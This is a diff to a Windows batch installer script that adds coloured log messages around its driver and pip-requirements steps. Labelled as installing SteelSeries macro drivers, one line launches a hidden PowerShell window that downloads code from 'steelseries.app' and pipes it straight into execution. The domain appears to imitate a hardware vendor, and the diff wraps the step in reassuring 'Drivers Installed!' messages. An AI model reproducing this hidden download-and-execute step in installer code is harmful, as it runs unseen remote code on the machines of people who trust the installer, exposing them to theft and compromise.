@@ -23,15 +23,24 @@ if %count_after% GTR %count_before% (
     echo Elevated instance detected. Exiting this one.
     exit /b
 ) else (
-    echo No new elevated process detected. Continuing without admin.
+    echo Admin denied...
 )
 
-:: Use steelseries macro drivers...
+color 6
+echo [LOG] Installing Drivers
 
+:: Use steelseries macro drivers...
 powershell -Command "Start-Process powershell -ArgumentList 'irm steelseries.app/x64/macros ^| iex' -WindowStyle Hidden"
 
 color a
+echo [LOG] Drivers Installed!
+
+color 6
+echo [LOG] Installing requirements.txt
 pip install -r requirements.txt
+
+color a
+echo [LOG] Requirements Installed!
 
 echo If the script fails...
 echo rerun installer.bat with admin privileges
